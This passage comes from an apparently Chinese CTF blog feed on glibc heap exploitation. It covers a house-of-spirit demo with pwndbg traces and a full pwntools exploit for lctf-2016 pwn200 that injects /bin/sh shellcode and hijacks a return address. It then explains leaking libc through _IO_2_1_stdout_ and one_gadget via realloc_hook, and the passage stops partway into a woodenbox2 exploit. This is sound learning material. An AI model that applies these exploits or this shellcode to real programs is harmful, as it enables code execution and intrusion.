class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>)；</span><br><span class="line">        </span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>调用一次malloc设置内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:11</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x20fe1</span><br><span class="line">&#125;</span><br><span class="line">0x603020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 135137, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设存在某个可控的区域，例如栈上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:18</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$1 = (unsigned long long *) 0x7fffffffde28</span><br><span class="line">pwndbg&gt; p *a</span><br><span class="line">$2 = 140737488347640</span><br><span class="line">pwndbg&gt; p fake_chunks </span><br><span class="line">$3 = &#123;1, 140737488346448, 140737354129768, 15775231, 1, 4196589, 140737488346414, 0, 4196512, 4195760&#125;</span><br><span class="line">pwndbg&gt; p &amp;fake_chunks                                                               </span><br><span class="line">$4 = (unsigned long long (*)[10]) 0x7fffffffdcd0</span><br><span class="line">pwndbg&gt; x/10gx &amp;fake_chunks </span><br><span class="line">0x7fffffffdcd0: 0x0000000000000001      0x00007fffffffdd50</span><br><span class="line">0x7fffffffdce0: 0x00007ffff7ffe168      0x0000000000f0b5ff</span><br><span class="line">0x7fffffffdcf0: 0x0000000000000001      0x00000000004008ed</span><br><span class="line">0x7fffffffdd00: 0x00007fffffffdd2e      0x0000000000000000</span><br><span class="line">0x7fffffffdd10: 0x00000000004008a0      0x00000000004005b0</span><br></pre></td></tr></table></figure><p>设置fake_chunk的size和next chunk size来绕过检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:26</span><br><span class="line">pwndbg&gt; p fake_chunks                                                                 </span><br><span class="line">$5 = &#123;1, 64, 140737354129768, 15775231, 1, 4196589, 140737488346414, 0, 4196512, 4660&#125;</span><br><span class="line">pwndbg&gt; x/10gx &amp;fake_chunks                                                           </span><br><span class="line">0x7fffffffdcd0: 0x0000000000000001      0x0000000000000040  &lt;-fake_chunk size</span><br><span class="line">0x7fffffffdce0: 0x00007ffff7ffe168      0x0000000000f0b5ff</span><br><span class="line">0x7fffffffdcf0: 0x0000000000000001      0x00000000004008ed</span><br><span class="line">0x7fffffffdd00: 0x00007fffffffdd2e      0x0000000000000000</span><br><span class="line">0x7fffffffdd10: 0x00000000004008a0      0x0000000000001234  &lt;-next chunk size</span><br></pre></td></tr></table></figure><p>假设存在某个漏洞是我们可以free掉fake_chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:30</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$6 = (unsigned long long *) 0x7fffffffdce0</span><br></pre></td></tr></table></figure><p>free(a)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:33</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x7fffffffdcd0 ◂— 0x0  &lt;- fake_chunk</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>malloc(0x30)或malloc(0x38)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:34</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">malloc(0x30): 0x7fffffffdce0</span><br></pre></td></tr></table></figure><p>成功分配堆块到fake_chunk！</p><h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><ul><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求(&lt;= 128 on x64)，同时也得对齐</li><li>fake chunk 的 <code>ISMMAP</code> 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></li></ul><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----------------------</span><br><span class="line">|可控区域（设置fakesize）|</span><br><span class="line">-----------------------</span><br><span class="line">|不可控区域             |</span><br><span class="line">-----------------------</span><br><span class="line">|可控区域（设置nextsize）|</span><br><span class="line">-----------------------</span><br></pre></td></tr></table></figure><h3 id="例题：lctf-2016-pwn200"><a href="#例题：lctf-2016-pwn200" class="headerlink" title="例题：lctf-2016-pwn200"></a>例题：lctf-2016-pwn200</h3><h4 id="动态调试-1"><a href="#动态调试-1" class="headerlink" title="动态调试"></a>动态调试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx $rsp+8</span><br><span class="line">0x7fffffffdbe0: 0x000000000000000e      0x0000000000000000</span><br><span class="line">0x7fffffffdbf0: 0x00007fffffffdc10      0x00000000004009e0</span><br><span class="line">0x7fffffffdc00: 0x0000000000000000      0x00007ffff7ffe168</span><br><span class="line">0x7fffffffdc10: 0x00007fffffffdc60      0x0000000000400a8c</span><br><span class="line">0x7fffffffdc20: 0x00007fff0a626262(moeny) 0x0000000000000000</span><br><span class="line">0x7fffffffdc30: 0x0000000000000000      0x00007ffff7a43e90</span><br><span class="line">0x7fffffffdc40: 0x0000000000000009      0x00000000004008b5</span><br><span class="line">0x7fffffffdc50:(fake_chunk)0x0000000000003233      0x0000000000603010(堆地址，可修改)</span><br><span class="line">0x7fffffffdc60: 0x00007fffffffdcc0      0x0000000000400b34(函数返回地址)</span><br><span class="line">0x7fffffffdc70: 0x00007ffff7dd18e0      0x00007ffff7fd8700</span><br><span class="line">0x7fffffffdc80: 0x0000000000000003      0x0000000000000020(id)</span><br><span class="line">0x7fffffffdc90: 0x00007fff00616161(name) 0x00007ffff7a7cfb4</span><br><span class="line">0x7fffffffdca0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fffffffdcb0: 0x00007fffffffdcc0      0x00000000004007dd</span><br><span class="line">0x7fffffffdcc0: 0x00007fffffffdce0(rbp) 0x0000000000400b59</span><br><span class="line">0x7fffffffdcd0: 0x00007fffffffddc8      0x0000000100000000</span><br><span class="line">0x7fffffffdce0: 0x0000000000400b60      0x00007ffff7a2d830</span><br><span class="line">0x7fffffffdcf0: 0x0000000000000001      0x00007fffffffddc8</span><br><span class="line">0x7fffffffdd00: 0x00000001f7ffcca0      0x0000000000400b36</span><br><span class="line">0x7fffffffdd10: 0x0000000000000000      0xb01cdc16417a5d66</span><br></pre></td></tr></table></figure><p>name的大小为48，因此可以泄露rbp，可以看到：</p><ul><li>name_addr = rbp - 0x50</li><li>fake_chunk = name_addr- 0x90</li></ul><p>money的大小0x40，可以设置fake_chunk size = 0x40以及修改堆地址为fake_chunk的地址(0x7fffffffdc50)</p><p>id刚好为nextsize</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ol><li>在name处写入shellcode</li><li>利用hos控制fake_chunk</li><li>修改函数返回地址为name地址，即shellcode地址</li><li>函数返回，执行shellcode</li></ol><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./pwn200"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"who are u?"</span>)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')</span></span><br><span class="line">shellcode=<span class="string">""</span></span><br><span class="line">shellcode += <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e"</span></span><br><span class="line">shellcode += <span class="string">"\x2f\x2f\x73\x68\x56\x53\x54\x5f"</span></span><br><span class="line">shellcode += <span class="string">"\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"><span class="keyword">print</span> len(shellcode)</span><br><span class="line">payload = shellcode.ljust(<span class="number">48</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">rbp = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(rbp)</span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line">fake_chunk = shellcode_addr - <span class="number">0x40</span></span><br><span class="line">p.recvuntil(<span class="string">"give me your id ~~?"</span>)</span><br><span class="line">p.sendline(<span class="string">'32'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"give me money~"</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0x41</span>) + p64(<span class="number">0</span>) +p64(fake_chunk)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"how long?"</span>,<span class="string">"48"</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(shellcode_addr)</span><br><span class="line">p.sendlineafter(<span class="string">"money :"</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用_IO_2_1_stdout_泄漏libc</title>
      <link href="/2020/03/13/%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E6%BC%8Flibc/"/>
      <url>/2020/03/13/%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E6%BC%8Flibc/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h4><p>overlapping是一种堆块漏洞利用中相当常见的套路,非常好用，它比较常见的利用条件是off-by-one等堆漏洞。</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh</a></p><h4 id="IO-2-1-stdout"><a href="#IO-2-1-stdout" class="headerlink" title="_IO_2_1_stdout_"></a>_IO_2_1_stdout_</h4><p>查看stdout结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdout</span><br><span class="line">$4 = (struct _IO_FILE *) 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; p/x _IO_2_1_stdout_</span><br><span class="line">$7 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xfbad2887, </span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd18e0, </span><br><span class="line">    _fileno = 0x1, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0xffffffffffffffff, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &#123;0xa&#125;, </span><br><span class="line">    _lock = 0x7ffff7dd3780, </span><br><span class="line">    _offset = 0xffffffffffffffff, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd17a0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0xffffffff, </span><br><span class="line">    _unused2 = &#123;0x0 &lt;repeats 20 times&gt;&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当stdout-&gt;_flags改变时，可能打印出libc地址，具体参考/usr/include/x86_64-linux-gnu/bits/libio.h </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_MAGIC 0xFBAD0000 /* Magic number */</span><br><span class="line">#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */</span><br><span class="line">#define _IO_MAGIC_MASK 0xFFFF0000</span><br><span class="line">#define _IO_USER_BUF 1 /* User owns buffer; don&apos;t delete it on close. */</span><br><span class="line">#define _IO_UNBUFFERED 2</span><br><span class="line">#define _IO_NO_READS 4 /* Reading not allowed */</span><br><span class="line">#define _IO_NO_WRITES 8 /* Writing not allowd */</span><br><span class="line">#define _IO_EOF_SEEN 0x10</span><br><span class="line">#define _IO_ERR_SEEN 0x20</span><br><span class="line">#define _IO_DELETE_DONT_CLOSE 0x40 /* Don&apos;t call close(_fileno) on cleanup. */</span><br><span class="line">#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/</span><br><span class="line">#define _IO_IN_BACKUP 0x100</span><br><span class="line">#define _IO_LINE_BUF 0x200</span><br><span class="line">#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */</span><br><span class="line">#define _IO_CURRENTLY_PUTTING 0x800</span><br><span class="line">#define _IO_IS_APPENDING 0x1000</span><br><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line">#define _IO_BAD_SEEN 0x4000</span><br><span class="line">#define _IO_USER_LOCK 0x8000</span><br></pre></td></tr></table></figure><p>一种泄露libc的用法是添加_IO_CURRENTLY_PUTTING和 _IO_IS_APPENDING标志位，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flags,modified_flag;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    flags = <span class="built_in">stdout</span>-&gt;_flags;</span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_flags = <span class="number">0xfbad2087</span> | <span class="number">0x1000</span> | <span class="number">0x800</span>;</span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_IO_write_base -= <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flags: 0x%x\n"</span>, flags);</span><br><span class="line">    modified_flag = <span class="built_in">stdout</span>-&gt;_flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"modified_flag: 0x%x\n"</span>, modified_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">�����flags: 0xfbad2087</span><br><span class="line">modified_flag: 0xfbad3887</span><br></pre></td></tr></table></figure><h4 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="realloc_hook"></a>realloc_hook</h4><p>realloc_hook的常见利用方式是在使用one_gadget时平衡栈空间。</p><p>one_gadget如下：在使用时需要满足一些栈条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  woodenbox one_gadget ./libc6_2.23-0ubuntu11_amd64.so </span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>由于调用realloc回去查看realloc_hook是否存在，存在的话会先调用realloc_hook。realloc_hook的地址刚好在malloc_hook上面。常见手段为：在malloc_hook中写入realloc+n，在realloc_hook中写入one_gadget。调用malloc来触发one_gadget。</p><h3 id="例题：gxzyCTF-woodenbox2"><a href="#例题：gxzyCTF-woodenbox2" class="headerlink" title="例题：gxzyCTF woodenbox2"></a>例题：gxzyCTF woodenbox2</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  woodenbox checksec woodenbox2 </span><br><span class="line">[*] &apos;/mnt/hgfs/shared/gxzy/pwn/woodenbox/woodenbox2&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">➜  woodenbox ./woodenbox2</span><br><span class="line">----------------------------</span><br><span class="line">Wooden Box Menu</span><br><span class="line">----------------------------</span><br><span class="line">1.add a new item</span><br><span class="line">2.change the item in the box</span><br><span class="line">3.remove the item in the box</span><br><span class="line">4.exit</span><br><span class="line">----------------------------</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure><p>保护全开，没有show，基本是要想办法泄露libc。程序在change的时候存在堆溢出，因此可以利用overlapping。然后结合unsortedbin来爆破_IO_2_1_stdout_的地址，改变flag来泄露libc，最后将one_gadget写入malloc来getshell。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 